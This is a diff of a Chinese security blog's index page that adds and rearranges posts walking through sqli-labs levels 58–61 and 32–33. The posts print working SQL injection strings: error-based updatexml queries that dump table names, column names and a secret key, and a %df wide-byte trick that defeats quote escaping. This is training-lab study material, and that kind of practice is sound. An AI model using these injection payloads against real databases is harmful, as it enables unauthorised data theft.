@@ -145,6 +145,72 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/21/article-title-17/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yanghaoxuan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yanghaoxuan'sBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/21/article-title-17/" class="post-title-link" itemprop="url">sqli-labs练习(第五十八-六十一关)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-01-21 21:43:41 / 修改时间：21:55:44" itemprop="dateCreated datePublished" datetime="2021-01-21T21:43:41+08:00">2021-01-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="五十八关"><a href="#五十八关" class="headerlink" title="五十八关"></a>五十八关</h4><p>这一关只有五次尝试机会，而且联合查询语句在这一关并不管用，以知库名为<code>challenges</code>，直接用语句</p>
+<p><code>?id=-1&#39; and updatexml(1, concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;)),1) --+</code>爆出表名<code>d5qhcc5r3m</code></p>
+<p><code>?id=-1&#39; and updatexml(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;d5qhcc5r3m&#39;)),1) --+</code>得到列名<code>secret_KNGZ</code></p>
+<p><code>?id=-1&#39; and updatexml(1, concat(0x7e,(select group_concat(concat_ws(0x7e,secret_KNGZ)) from d5qhcc5r3m)),1) --+</code>得到key <code>ToejBfm6Bn3RZSJivLuOLfgR</code></p>
+<p>成功提交。</p>
+<h4 id="五十九关"><a href="#五十九关" class="headerlink" title="五十九关"></a>五十九关</h4><p>这一关未对id值进行包裹，步骤与上一关相同。</p>
+<h4 id="六十关"><a href="#六十关" class="headerlink" title="六十关"></a>六十关</h4><p>闭合符为<code>&quot;)</code>，其他步骤皆相同。</p>
+<h4 id="六十一关"><a href="#六十一关" class="headerlink" title="六十一关"></a>六十一关</h4><p>闭合符为<code>&#39;))</code>,这是人能猜出来的？</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/20/article-title-16/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -548,6 +614,82 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/20/14/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yanghaoxuan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yanghaoxuan'sBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/20/14/" class="post-title-link" itemprop="url">sqli-labs练习(第三十二、三关) 宽字节注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-20 10:49:30" itemprop="dateCreated datePublished" datetime="2020-12-20T10:49:30+08:00">2020-12-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-16 22:01:44" itemprop="dateModified" datetime="2021-01-16T22:01:44+08:00">2021-01-16</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象"><a href="#宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象" class="headerlink" title="宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象"></a><strong>宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象</strong></h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。</p>
+<p>多字节字符集： 在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</p>
+<p>两位的多字节字符有一个前导字节和尾字节。 在某个多字节字符集内，前导字节位于某个特定范围内，尾字节也一样。</p>
+<p>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</p>
+<p>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。</p>
+<h4 id="第三十二、三关"><a href="#第三十二、三关" class="headerlink" title="第三十二、三关"></a>第三十二、三关</h4><p>先输入<code>id=1&#39;</code> </p>
+<p><img src="http://m.qpic.cn/psc?/V10iGthh1tdqax/ruAMsa53pVQWN7FLK88i5gUB9Ysn6yt1oC6fuVyohfyocwhOUcFPEWkj*7bCB8GhHInICbA5aYD3O3CuOpYHaHCK6t.4FKOq6v8Ui5t5MwA!/mnull&bo=bAQ.AQAAAAADB3U!&rf=photolist&t=5" alt="img"></p>
+<p>并没有出现报错，图片提示中语句多出一个<code>\</code> , <code>id=&#39;1&#39;和id=&#39;1\&#39;&#39;</code> 这两个语句都能顺利执行mysql语句，而<code>%df</code>经过转译之后就是<code>\</code>,所以使用宽字节注入只需要输入语句<code>?id=1%df&#39;</code></p>
+<p><img src="http://m.qpic.cn/psc?/V10iGthh1tdqax/ruAMsa53pVQWN7FLK88i5gUB9Ysn6yt1oC6fuVyohfwHI9CCJFUg7Jw*Ed0hGlwqXKetWbmRV3s8biWd0tLxCOfUlzKgrLgPT8Htxq12krU!/mnull&bo=EgWZAgAAAAADB64!&rf=photolist&t=5" alt="img"></p>
+<p>出现报错，接下来加上注释符<code>--+</code>，回显正常，然后就是常规的操作语句</p>
+<p><img src="http://m.qpic.cn/psc?/V10iGthh1tdqax/ruAMsa53pVQWN7FLK88i5gUB9Ysn6yt1oC6fuVyohfxpOXD1IJ2Engt02QvJOqBA5RTXYb*4YE6DUym987zi9af4R69.oduz0ICpuPbZTM4!/mnull&bo=hgWNAgAAAAADBy4!&rf=photolist&t=5" alt="img"></p>
+<p>先得到库名，接下来再得到其他信息(最好将<code>&#39;security&#39;</code>转化为16进制的写法<code>0x7365637572697479</code>，这样可以省去不必要的麻烦)</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/20/13/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -630,82 +772,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/20/14/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yanghaoxuan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yanghaoxuan'sBlog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/20/14/" class="post-title-link" itemprop="url">sqli-labs练习(第三十二、三关) 宽字节注入</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-12-20 10:49:30" itemprop="dateCreated datePublished" datetime="2020-12-20T10:49:30+08:00">2020-12-20</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-16 22:01:44" itemprop="dateModified" datetime="2021-01-16T22:01:44+08:00">2021-01-16</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象"><a href="#宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象" class="headerlink" title="宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象"></a><strong>宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象</strong></h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。</p>
-<p>多字节字符集： 在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</p>
-<p>两位的多字节字符有一个前导字节和尾字节。 在某个多字节字符集内，前导字节位于某个特定范围内，尾字节也一样。</p>
-<p>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</p>
-<p>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。</p>
-<h4 id="第三十二、三关"><a href="#第三十二、三关" class="headerlink" title="第三十二、三关"></a>第三十二、三关</h4><p>先输入<code>id=1&#39;</code> </p>
-<p><img src="http://m.qpic.cn/psc?/V10iGthh1tdqax/ruAMsa53pVQWN7FLK88i5gUB9Ysn6yt1oC6fuVyohfyocwhOUcFPEWkj*7bCB8GhHInICbA5aYD3O3CuOpYHaHCK6t.4FKOq6v8Ui5t5MwA!/mnull&bo=bAQ.AQAAAAADB3U!&rf=photolist&t=5" alt="img"></p>
-<p>并没有出现报错，图片提示中语句多出一个<code>\</code> , <code>id=&#39;1&#39;和id=&#39;1\&#39;&#39;</code> 这两个语句都能顺利执行mysql语句，而<code>%df</code>经过转译之后就是<code>\</code>,所以使用宽字节注入只需要输入语句<code>?id=1%df&#39;</code></p>
-<p><img src="http://m.qpic.cn/psc?/V10iGthh1tdqax/ruAMsa53pVQWN7FLK88i5gUB9Ysn6yt1oC6fuVyohfwHI9CCJFUg7Jw*Ed0hGlwqXKetWbmRV3s8biWd0tLxCOfUlzKgrLgPT8Htxq12krU!/mnull&bo=EgWZAgAAAAADB64!&rf=photolist&t=5" alt="img"></p>
-<p>出现报错，接下来加上注释符<code>--+</code>，回显正常，然后就是常规的操作语句</p>
-<p><img src="http://m.qpic.cn/psc?/V10iGthh1tdqax/ruAMsa53pVQWN7FLK88i5gUB9Ysn6yt1oC6fuVyohfxpOXD1IJ2Engt02QvJOqBA5RTXYb*4YE6DUym987zi9af4R69.oduz0ICpuPbZTM4!/mnull&bo=hgWNAgAAAAADBy4!&rf=photolist&t=5" alt="img"></p>
-<p>先得到库名，接下来再得到其他信息(最好将<code>&#39;security&#39;</code>转化为16进制的写法<code>0x7365637572697479</code>，这样可以省去不必要的麻烦)</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/15/12/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -764,66 +830,6 @@
 <p><img src="http://m.qpic.cn/psc?/V10iGthh1tdqax/ruAMsa53pVQWN7FLK88i5s9o1aasUDim7BHN1me6cw2VdHiMF045cv6TPPUWVGP8a0*HihOotkYX*yJJlRTCk2P7ju3aglESX.ob8qq02Wo!/mnull&bo=ZgNJAgAAAAADBww!&rf=photolist&t=5" alt="img"></p>
 <p>接下来获取其他信息的语句不再描述</p>
 <h4 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h4><p>与上一关相同，对referer进行注入</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/15/article-title-10/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yanghaoxuan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yanghaoxuan'sBlog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/15/article-title-10/" class="post-title-link" itemprop="url">article title</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-12-15 11:21:38 / 修改时间：12:08:15" itemprop="dateCreated datePublished" datetime="2020-12-15T11:21:38+08:00">2020-12-15</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>![屏幕截图 2020-12-15 112242](C:\Users\Y4n9ne\Pictures\屏幕截图 2020-12-15 112242.png)</p>
-<p>第十七关要求我们重新设置密码</p>
 
       
     </div>
